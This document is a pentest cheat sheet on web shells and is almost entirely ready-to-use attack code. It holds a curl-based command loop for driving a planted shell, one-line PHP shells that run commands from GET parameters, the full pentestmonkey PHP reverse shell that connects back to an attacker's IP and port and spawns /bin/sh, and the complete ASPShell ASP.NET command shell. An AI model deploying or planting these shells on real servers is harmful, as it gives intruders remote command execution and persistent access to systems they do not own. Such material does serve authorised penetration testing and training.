# Web Shells

### Simple bash script to handle basic webshell

```bash
#Save next onliner as cli.sh
while true;do read -p "[>] :~$ " cmd;curl $1$cmd;done

#Usage: ./cli.sh http://target.com/path/to/shell.php?0=
```

### PHP - Basic

```bash
#Simple Webshell - system
<?php echo system($_GET["cmd"]); ?>

#Simple Webshell - passthru
<?php echo passthru($_GET['cmd']); ?>

#Tiny Webshell
<?=`$_GET[0]`?>
```

### PHP - pentestmonkey php revshell

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS <-----
$port = 1234;       // CHANGE THIS <-----
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}


	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

### ASP.NET

```aspnet
<%@ Language = "JScript" %>
<%
/*
    ASPShell - web based shell for Microsoft IIS
    Copyright (C) 2007  Kurt Hanner

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

    http://aspshell.sourceforge.net
*/
  var version = "0.2 (beta) [2007-09-29]";
  var homepagelink = "http://aspshell.sourceforge.net";

  var q = Request("q")();
  var cd = Request("cd")();
  if (q)
  {
    var command = "";
    var output = "";
    if (q.length == 0)
    {
      q = ":";
    }
    command = "" + q;
    if (command == "?")
    {
      output = "    ?                    this help page\n" +
               "    :sv                  all server variables\n" +
               "    <shell command>      execute any shell command\n";
    }
    else if (command.toLowerCase() == ":sv")
    {
      var sv = "";
      var svvalue = "";
      var esv = new Enumerator(Request.ServerVariables);
      for (; !esv.atEnd(); esv.moveNext())
      {
        sv = esv.item();
        output += sv;
        output += ": ";
        svvalue = "" + Request.ServerVariables(sv);
        if (svvalue.indexOf("\n") >= 0)
        {
          output += "\n";
          var svitems = svvalue.split("\n");
          for (var i=0; i<svitems.length; i++)
          {
            if (svitems[i].length > 0)
            {
              output += "    ";
              output += svitems[i];
              output += "\n";
            }
          }
        }
        else
        {
          output += svvalue;
          output += "\n";
        }
      }
    }
    else if (command.toLowerCase() == ":cd")
    {
      var fso = new ActiveXObject("Scripting.FileSystemObject");
      output = fso.GetAbsolutePathName(".");
    }
    else if (/^:checkdir\s(.*)?$/i.test(command))
    {
      var newdirabs = "";
      var newdir = RegExp.$1;
      var fso = new ActiveXObject("Scripting.FileSystemObject");
      var cdnorm = fso.GetFolder(cd).Path;
      if (/^\\/i.test(newdir)) 
      {
        newdirabs = fso.GetFolder(cd).Drive + newdir;
      }
      else if (/^\w:/i.test(newdir))
      {
        newdirabs = fso.GetAbsolutePathName(newdir);
      }
      else
      {
        newdirabs = fso.GetAbsolutePathName(fso.GetFolder(cd).Path + "\\" + newdir);
      }
      output = fso.FolderExists(newdirabs) ? newdirabs : "fail";
    }
    else
    {
      var changedir = "";
      var currdrive = "";
      var currpath = "";
      var colonpos = cd.indexOf(":");
      if (colonpos >= 0) {
        currdrive = cd.substr(0, colonpos+1);
        currpath = cd.substr(colonpos+1);
        changedir = currdrive + " && cd \"" + currpath + "\" && ";
      }
      var shell = new ActiveXObject("WScript.Shell");
      var pipe = shell.Exec("%comspec% /c \"" + changedir + command + "\"");
      output = pipe.StdOut.ReadAll() + pipe.StdErr.ReadAll();
    }
    Response.Write(output);
  }
  else
  {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var currentpath = fso.GetAbsolutePathName(".");
    var currentdrive = fso.GetDrive(fso.GetDriveName(currentpath));
    var drivepath = currentdrive.Path;
%>
<html>

<head>
<meta HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<style><!--
  body {
    background: #000000;
    color: #CCCCCC;
    font-family: courier new;
    font-size: 10pt
  }
  input {
    background: #000000;
    color: #CCCCCC;
    border: none;
    font-family: courier new;
    font-size: 10pt;
  }
--></style>

<script language="JavaScript"><!--

  var history = new Array();
  var historypos = 0;
  var currentdirectory = "";
  var checkdirectory = "";

  function ajax(url, vars, callbackFunction)
  {
    var request = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("MSXML2.XMLHTTP.3.0");
    request.open("POST", url, true);
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
    request.onreadystatechange = function()
    {
      if (request.readyState == 4 && request.status == 200)
      {
        if (request.responseText)
        {
          callbackFunction(request.responseText);
        }
      }
    }
    request.send(vars);
  }

  function FormatOutput(txt)
  {
    return txt.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\x20/g, "&nbsp;").replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;").replace(/\n/g, "<br/>");
  }

  function KeyDownEventHandler(ev)
  {
    document.all("q").focus();
    if (!ev)
    {
      ev = window.event;
    }
    if (ev.which)
    {
      keycode = ev.which;
    }
    else if (ev.keyCode)
    {
      keycode = ev.keyCode;
    }
    if (keycode == 13)
    {
      var cmd = document.all("q").value;
      outputAvailable("[" + currentdirectory + "] " + cmd);
      if (/cd\s+(\"?)(.*)?\1\s*$/i.test(cmd))
      {
        checkdirectory = RegExp.$2;
        ajax(document.URL, "q=" + encodeURIComponent(":checkdir " + RegExp.$2) + "&cd=" + encodeURIComponent(currentdirectory), checkdirAvailable);
        history[history.length] = cmd;
        historypos = history.length;
      }
      else if (cmd.length > 0)
      {
        ajax(document.URL, "q=" + encodeURIComponent(cmd) + "&cd=" + encodeURIComponent(currentdirectory), outputAvailable);
        history[history.length] = cmd;
        historypos = history.length;
      }
    }
    else if (keycode == 38 && historypos > 0)
    {
      historypos--;
      document.all("q").value = history[historypos];
    }
    else if (keycode == 40 && historypos < history.length)
    {
      historypos++;
      if (historypos == history.length)
      {
        document.all("q").value = "";
      }
      else {
        document.all("q").value = history[historypos];
      }
    }
  }

  function outputAvailable(output)
  {
    var newelem = document.createElement("DIV");
    newelem.innerHTML = FormatOutput(output);
    document.all("output").appendChild(newelem);
    var oldYPos = 0, newYPos = 0;
    var scroll = true;
    do
    {
      if (document.all)
      {
        oldYPos = document.body.scrollTop;
      }
      else
      {
        oldYPos = window.pageYOffset;
      }
      window.scrollBy(0, 100);
      if (document.all)
      {
        newYPos = document.body.scrollTop;
      }
      else
      {
        newYPos = window.pageYOffset;
      }
    } while (oldYPos < newYPos);
    document.all("q").value = "";
  }

  function checkdirAvailable(output)
  {
    if (output.toLowerCase() == "fail")
    {
      outputAvailable("The system cannot find the path specified.");
    }
    else {
      SetCurrentDirectory(output);
    }
  }

  function SetCurrentDirectory(output)
  {
    currentdirectory = output;
    document.all("prompt").innerHTML = "[" + output + "]";
  }

  function GetCurrentDirectory()
  {
    ajax(document.URL, "q=" + encodeURIComponent(":cd"), SetCurrentDirectory);
  }

  function InitPage()
  {
    document.all("q").focus();
    document.onkeydown = KeyDownEventHandler;
    GetCurrentDirectory();
  }
//--></script>

<title id=titletext>Web Shell</title>
</head>

<body onload="InitPage()">

<div id="output">
  <div id="greeting">
    ASPShell - Web-based Shell Environment Version <%=version%><br/>
    Copyright (c) 2007 Kurt Hanner, <a href="<%=homepagelink%>"><%=homepagelink%></a><br/><br/>
  </div>
</div>

<label id="prompt">[undefined]</label>
<input type="text" name="q" maxlength=1024 size=72>

</body>
</html>
<%
  }
%>
```

### b347k (PHP) webshell

{% embed url="https://github.com/b374k/b374k" %}
